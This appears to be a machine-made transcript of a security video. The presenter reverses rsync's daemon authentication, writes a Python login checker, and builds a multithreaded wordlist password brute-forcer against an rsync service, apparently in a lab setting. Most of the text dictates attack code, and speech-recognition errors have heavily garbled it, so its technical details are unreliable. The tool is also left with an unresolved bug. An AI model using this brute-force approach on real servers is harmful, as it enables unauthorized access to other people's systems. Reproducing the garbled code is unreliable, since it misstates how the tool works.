emit we have int C some type n seed so we did some an it negative one and either 0 and all 0 so seed is zero and see some type is negative one so summon it if see some type is less than zero then see some type is equal to par see some name null zero and then we go into a bunch of cases so let's look at purse see some named see some name let's choice here we go here's the function and we have if length and name length I don't know what that's doing we gave it zero I think forget what we gave it name protocol version is equal to 30 then md5 so I bet if we do some update there's probably a case yep right here so if it's md5 then md5 update else go do this MD for archaic stuff and n authenticate despite the comment saying MD for I'm betting this is md5 because the protocol version as Wireshark shows is 31.0 so let's go and update our code so we can do no md5 update and we'll do this one with password and then we'll do this one with shall be 64 and finally we can do the be 64 encode of the hex digest and not hex digest of just the digest and we don't want it to encode and let's see get what we wanted why didn't you do this M is equal to new wait new hashlib mb5 m dot update with password was that putting past when in quotes before no update password and update shall be 64 be 64 encode m dot digest that is not equal to what i expect she'll be 64 a 8p o chão be 64 is equal to n this because it strips the stupid equal signs so that's where i had screwed up probably new md5 well thankfully it doesn't really matter because we had to do mb 5 anyways so we didn't waste too much time m update password and we can do shall be 64 dot in code there we go and we do the be 64 encode digest there we go so we know to be very careful with these stupid equal signs we have to strip the mail but we got it so now we can finally create our sync underscore log n pi so we do from base 64 import be 64 encode and be 64 decode and we'll do em port hash lib created function for generate hash I'm going to do password and hash or challenge there we go and we'll do password and put a password in code challenge and guess I'm will be able to remove these eventually but because we're just going to test this function out and leave them there and now M is equal to hash Lib new MMD for great and m dot update password m dot update challenge and return nope or just do md5 five hash is equal to be 64 encode m dot digest like that and then we do md5 hash is equal to md5 hash a place and we replace equals with nothing and return md5 hash we can call a strip on it as well to make sure it doesn't end with a line break for good measure there we go so now we should be able to print generate hash and we'll give it the password which i think was please support me on patreon and the challenge which is this and then hopefully the hard part is done I don't know where my cursor went way up there Python 3 or sync login let's see line 14 11 but it's like okay right here md5 hash equals md5 hash decode replace wants it to be a string and because it's doing the basics we encode it's a by player object or sink support me on patreon there we go so now we have a phone to generate the hash all we have to do is login to the server so that module is just socket so we'll do from socket import star now we can comment that out a DDR info is equal to get a DDR info the IP address port 8730 AF I met six and Sox train we want to print ad our info zero to get everything okay or a sink there we go let's copy the password and not password the IP and put it here okay Python 3 our sink wall again sock stream underscore like that there we go so let's see the first one is going to be family that's a sock type next is protocol socket idiot info AF PI net 6 three see does this tell me if I do this this may help family type protocol dress length socket address can the name okay here it is so a f-type proto can a name that's what it is so that blank is probably Canada name and then suck dress because the rest of this is I think that's a tuple okay so we can make all those equal to this family soft type proto cannon name suck KD r is equal to that this is just how you initiate a socket or how I do it then s is equal to socket family soft type proto s dot receive 4096 s end test and we'll try the cell endpoint not connected s dot connect that soccer dress there we go fights like object not string not used to Python 3 sweet so this is equal to this print test what are you telling me server okay so it's sending at our sync D 31.0 so we want to send it that as well so copy and we will send this so let's see what this looks like on the wire so Wireshark stop start you out saving run and we can follow TCP stream and we sent it we just didn't send the line break so that's all we want to do now so send is that going to press it I actually don't know what that's going to do you start Wireshark follow stream there we go that's what we want so the next thing we wanted to send was I think home underscore ROI so send that receive and then we'll send home ROI but we're shocking well stream okay now we have this and that's exactly what we want so we almost got a login done so now we do s receive okay and we'll do output is equal to this print output awesome so we just got to grab this so we've already just split this grab the third value and then chop off the head so we can do I'll put what we call this challenge is equal to output dot split 3 dot strip and we can print challenge it's probably going to give me an error because of byte encoding split on space and it's going to be like expected string once bite yeah Oh bites like object is required dot string dot encode oh there we go out of range okay one to 302 because it starts at zero there we go and now we just got a strip off that end so dot strip there we go so now we have a consistent challenge so we can do deaf well again and we'll do everything hard-coded because we're lazy so let's see address socket boy challenge and we will do dot decode because we want that in string because up here we encode it so sponsz is equal to generate hash support or do computer computer which is his password and challenge s dot send response backslash n ok so now let's restart Wireshark and see if we get a login success oh well again let's see bites like object why not string follow TCP boy so we never sent a password okay now it works follow TCP stream all failed why'd it all fail oh we need sand Roy space Roy space okay that looks promising follow TCP stream pressing B okay so we'll say output is equal to this if and output return drill capital T else return false if login print success else print fail they're really screw up an if-then statement in Python oh I see it it's this one there we go Rona fights like object here I really gotta find a better way to deal with this there we go success and if we do a different response so we do instead of computer would do computer we could fail so now we have a login checker for a Python awesome so the last piece the second program we have to do is a way to get python threading so relatively simple it's going to be much more simple than reversing that our sock thing and our sync thing and then finally the final piece will be combining them which is the simplest of them so we started heard and we're going easy so let's just V demo PI then we'll just go over to a web browser and Google Python 3 concurrent and go to the very first result and we want to look at this example but unfortunately a text box is horribly formatted holy crap let's split CD code the example dot pi paste set paste paste there we go so that's the example on the right and we'll do our coding on the left so import concurrent futures and we're not going to do this with URLs so we can get rid of those and instead of load your we'll call that function later with concurrent dot futures dot thread pull executor max workers equals five so this is a number of threads as executor there we go OCD this will be the next step the job so we'll call this job is equal to executor dot submit and we have to create the function and from time import sleep from random and poor random so what we're going to do instead of grabbing a bunch of URLs we're going to have twenty different threads and each thread is going to get a random sleep between zero seconds and five seconds and then just end so we'll be able to see all the threads spinning up and all the threads dying down so that's going to be the goal of this so def will call this my thread and the only argument when I pass to it is thread ID so we'll do sleep timeout is equal to R and int 0 to 5 print F start thread thread ID with sleep of sleep timeout then we'll sleep for the timeout and then we'll return thread ID so we're submitting the thread so submit my thread and then the argument you want to pass to it so thread underscore ID and then we have to create the range so here that's doing the URLs so we'll do thread ID for thread ID and range 0 20 so we'll just do 20 numbers okay for future and concurrent futures as completed and we call it job so for every thread that's done print F and thread and future dot result and that's gonna grab the result like that sorry I just hit the microphone if something games the rail so I think that's all we need so mate hopefully this code is simpler than that demo and I didn't just complicate it so if we do Python 3 demo of course I can't code 14 I didn't do a frenzy but I've read see uh quote there we go so we can see we immediately started a bunch of threads and now only stunning threads as they die so this is how we want to tackle a word list so cat demo PI we can just copy this copy demo dot pi to brute we'll call it or a sync route dot pi and then cat code or a sync all again and let's start grabbing this so we need these functions grab all this paste set paste okay I'm just going up and hitting n to make sure I didn't copy a bunch of whitespace every now and then like when I go in the clipboard and do what I'm doing it treats this as whitespace and copies that so that's all I was doing there and login and want to give login a username and a login a password so well again let's see turn true we can just ah here for some reason it did the white space here so we can see bunches and bunches of white space so when we copy this be set paste paste bunch of white space again that's good here is not holy cow which stabbed man there if they even copied if you can put a line break there so leave all this and we'll get out it will copy it via team ox that's how we'll do it highlight with space go beginning enter and we'll do control be paste there we go now we're copied correctly it's always a it to troubleshooting copy and paste commands so my thread we just need to put password here okay and let's see is this tabs spaces spaces if future dot result [Music] try to think what to do here will be really bad programmers and do nothing there and will print everything here so if this is true print password so really bad program now you should return it and do it properly but my brain is getting fried from doing this video now we need to do Python to go through a file let's copy word list here and let's see for thread ID and open word list dot text dot read lines maybe let's see if this works executer submit this will be login password password password Python 3 Oh sync fruit pie and of course it doesn't work print output so we're getting a few or sink okay's which I think I know why because we're bad coders and we should feel bad but we're always setting it the password of computer this needs to be password and I'm probably gonna get a stupid biting coding error or not let's see let's control see it and see P word list - wordless dot back and we'll put computer near the top so we should return it pretty quickly and we're not my guess is we probably have a line break and password V what is it pressing fruit pie and print password let's see what this is yep we got a line break so password equals password dot strip and it's still not working I've expected it by then response challenge so right here's what we want print password so one of the threads did say computer and the program song turns out threading is tough I hate Python threading I thought this would be simple now let's see brent password print output see off-off-off fail ok we got one but Dan seem to work print output I'll fail yep so it's working actually so we get rid of this there we go so if we want to do this properly let's see if we can real quick if our sink and output we can return password and else return false if future dot result well we can do maybe if not future dot result print future dot result that's still going to work maybe not see print future dot result see how this is working I really expected to be done like 10 minutes ago I have a bug somewhere turn password print output let's do that again so we can see everything I'll fail or fail or fail off there okay so it's not even getting passed to this let's see prepped test I'm not sure why what I screwed up so let's see for future and concurrent up features is job completed job and job is defined here print end of job yeah I'm not sure why that's happening we set this to 50 as it can go exponentially faster yes so I guess I'll leave this as a challenge for you to fix up this threading script looks like I bit off more than jus but I mean it was pretty cool up until it wasn't print password and exit or end guy I don't know how to kill Python Python script terminate how do I do this turning a Python script control see cyst on exit sistar exit and port sis is gonna exit even though it's in the thread of course not so that's it for the video I hope you guys enjoyed it and learn something and maybe this is a humbling experience that sometimes it's just a pain to code and you should take breaks because I'm sure I'm gonna take a break and then come back to this after I exercises something and it'll be super obvious what I was doing wrong but at least hey it does work and got proof take care guys see you all next week